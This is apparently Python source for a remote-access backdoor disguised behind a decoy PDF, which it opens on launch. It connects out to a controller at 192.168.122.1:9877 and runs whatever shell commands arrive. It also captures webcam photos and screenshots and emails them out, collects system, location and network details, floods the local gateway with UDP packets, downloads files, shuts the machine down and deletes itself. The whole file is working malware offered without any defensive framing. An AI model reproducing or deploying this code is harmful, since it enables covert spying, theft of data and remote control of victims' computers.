import socket
import subprocess
import os
import requests
import wget

class Backdoor:
    def __init__(self, ip, port):
        try:
            self.ip = ip
            self.port = port
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((ip, port))
            print('[+] Connected to ' + str(ip))
            self.commands()
        except Exception as e:
            print('[-] Error: ', e)

    def commands(self):
        global downloadURL
        command = self.s.recv(8192)
        output = self.terminal_execute(command)
        self.s.send(output)
        counter = 1
        while command:
            try:
                command = self.s.recv(8192)
                command = command.decode()
                if command[0:2] == 'cd':
                    command = command.split(' ')
                    result = self.change_cwd(command[1])
                    self.s.send(result.encode())
                elif command[0:3] == 'cat':
                    text = ''.join(os.popen(command).readlines())
                    self.s.send(text.encode())
                elif command[0:9] == 'eavesdrop':
                    self.s.send("[+] Eavesdropping...".encode())
                    self.eavesdrop()
                elif command[0:4] == 'ddos':
                    self.s.send("[+] DDoS Attack Starting...".encode())
                    self.ddos(num_packets=500)
                elif command[0:6] == 'webcam':
                    try:
                        self.s.send("[+] Webcam Jack".encode())
                        main_call, filename, interval, photo_limit = command.split(" ")
                        interval = int(interval)
                        photo_limit = int(photo_limit)
                        self.webcam_shot(filename, interval, photo_limit)
                    except:
                        self.s.send("[-] Webcam Error: usage: webcam [filename] [interval] [number-of-photos]".encode())
                elif command[0:10] == 'screenshot':
                    try:
                        self.s.send("[+] Screenshot".encode())
                        main_call, filename, interval, photo_limit = command.split(" ")
                        interval = int(interval)
                        photo_limit = int(photo_limit)
                        self.screenshot(filename, interval, photo_limit)
                    except:
                        self.s.send("[-] Screenshot Error: usage: screenshot [filename] [interval] [number-of-photos]".encode())
                elif command[0:16] == 'email_validation':
                    self.email, self.password = command[16:].split(" ")
                elif command[0:13] == 'self-destruct':
                    self.s.send("[+] Destroying files...".encode())
                    self.self_destruct()
                elif command[0:8] == 'shut-off':
                    self.s.send("[+] Shutting off victim's computer...".encode())
                    self.shut_off()
                elif command[0:8] == 'download':
                    downloadURL = command[9:]
                    self.download(downloadURL)
                    self.s.send(f'[+] Successfully downloaded {downloadURL}'.encode())
                else:
                    output = self.terminal_execute(command)
                    self.s.send(output)
            except Exception as e:
                self.s.send(f"[-] Invalid command: {e}".encode())

    def terminal_execute(self, command):
        try:
            if subprocess.getstatusoutput(command)[0] == 0:
                return subprocess.check_output(command, shell=True)
            else:
                return "[-] Error".encode()
        except:
            self.s.send("[-] Error".encode())

    def download(self, url):
        filename = url.split("/")[-1]
        wget.download(url, filename)

    def change_cwd(self, path):
        os.chdir(path)
        return "[+] Changing directory to " + path

    def screenshot(self, filename, interval, num_pics):
        from zipfile import ZipFile
        import time
        import pyautogui
        import os
        counter = 0
        filenames = []

        while counter < num_pics:
            name = filename + str(counter + 1) + ".jpg"
            filenames.append(name)
            pyautogui.screenshot(name)
            time.sleep(interval)
            counter += 1

        # zip and send in email
        with ZipFile(filename + '.zip','w') as zip1:
            # writing each file one by one
            for file in filenames:
                zip1.write(file)
                os.remove(file)

        self.send_mail(self.email, self.password, self.email, f"Screenshots for {filename}", subject="Screenshots", attach_list=[filename + '.zip'])
        os.remove(filename + '.zip')

    def eavesdrop(self):
        from threading import Thread
        from uuid import getnode as get_mac
        from time import sleep
        import pyautogui
        import socket
        import os
        import smtplib
        import subprocess
        import datetime
        import time
        import cv2
        import platform
        import sys
        import math
        import uuid

        def OS_info():
            return """
            Computer Name: {}
            IP Address: {}
            MAC Address: {}
            Public IP Address: {}
            Timezone: {}
            Date: {}
            Current Time: {}
            Python version: {}
            Dist: {}
            System: {}
            Machine: {}
            Platform: {}
            Uname: {}
            Version: {}
            Mac_ver: {}
            """ .format(
            socket.gethostname(),
            socket.gethostbyname(socket.gethostname()),
            get_mac(),
            subprocess.check_output('dig +short myip.opendns.com @resolver1.opendns.com',shell=True).decode()[:-2],
            time.tzname,
            datetime.datetime.now().date(),
            datetime.datetime.now().time(),
            sys.version.split('\n'),
            str(platform.dist()),
            platform.system(),
            platform.machine(),
            platform.platform(),
            platform.uname(),
            platform.version(),
            platform.mac_ver()
            )

        def openPorts():
            remoteServer = socket.gethostbyname(socket.gethostname())
            remoteServerIP  = socket.gethostbyname(remoteServer)
            open_ports_list = []

            for port in range(1,1025):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((remoteServerIP, port))
                if result == 0:
                    open_ports_list.append(port)
                sock.close()

            open_ports_string = "Ports open: "
            for i in open_ports_list:
                open_ports_string += str(i) + ", "
            return open_ports_string[:-2]

        def location():
            return subprocess.check_output('curl ipinfo.io',shell=True).decode()

        def arp_a():
            return subprocess.check_output('arp -a',shell=True).decode()

        def roundup(x):
            return int(math.ceil(x / 10.0)) * 10

        string = ""

        string += "OS Information: " + OS_info() + "\n"
        string += "Location: " + location() + "\n"
        string += "ARP A " + arp_a() + "\n"
        string += "Open Ports: " + openPorts() + "\n"
        self.send_mail(self.email, self.password, self.email, string, subject="Eavesdrop Results")

    def ddos(self, num_packets=655340):
        import netifaces
        import sys
        import os
        import time
        import socket
        import random

        ##############
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        #############

        os.system("clear")
        os.system("figlet DDos Attack")
        ip = router_ip = netifaces.gateways()['default'][2][0]
        port = 1

        os.system("clear")
        os.system("figlet Attack Starting")
        time.sleep(3)
        sent = 0
        while sent < num_packets:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            if port == 65534:
                port = 1

    def self_destruct(self):
        import os
        os.remove(__file__)

    def send_mail(self, USERNAME,PASSWORD,destination,msg_text,sender=None,subject="Test mail",attach_list=None):
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders

        fromaddr = USERNAME
        toaddr = destination
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = subject
        body = msg_text
        msg.attach(MIMEText(body, 'plain'))
        if attach_list is not None:
            for filename in attach_list:
                try:
                    attachment = open(filename, "rb")
                    p = MIMEBase('application', 'octet-stream')
                    p.set_payload((attachment).read())
                    encoders.encode_base64(p)
                    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
                    msg.attach(p)
                except Exception as e:
                    print("[-] Email Send Error:", e)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, PASSWORD)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()

    def shut_off(self):
        import os
        os.system('shutdown -s')

    def webcam_shot(self, filename, interval, photo_limit):
        from zipfile import ZipFile
        import cv2
        import time
        import os
        cap = cv2.VideoCapture(0)
        files = []
        counter = 1
        time.sleep(3)

        while counter < photo_limit + 1:
            ret, frame = cap.read()
            name = filename + str(counter) + '.jpg'
            cv2.imwrite(name, frame)
            files.append(name)
            time.sleep(interval)
            counter += 1

        with ZipFile(filename + '.zip','w') as zip1:
            # writing each file one by one
            for file in files:
                zip1.write(file)
                os.remove(file)

        self.send_mail(self.email, self.password, self.email, f"Webcam pictures for {filename}", subject="Webcam Jack Photos", attach_list=[filename + '.zip'])
        os.remove(filename + '.zip')

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

if __name__ == "__main__":
    file_name = resource_path(os.path.dirname(os.path.abspath(__file__))) + "/sample.pdf"
    subprocess.Popen('xdg-open ' + file_name, shell=True)

    ip = '192.168.122.1'
    port = 9877
    try:
        print(socket.gethostbyname(socket.gethostname()))
        backdoor = Backdoor(ip, port)
    except:
        print('Disconnecting from {0}:{1}'.format(ip, port))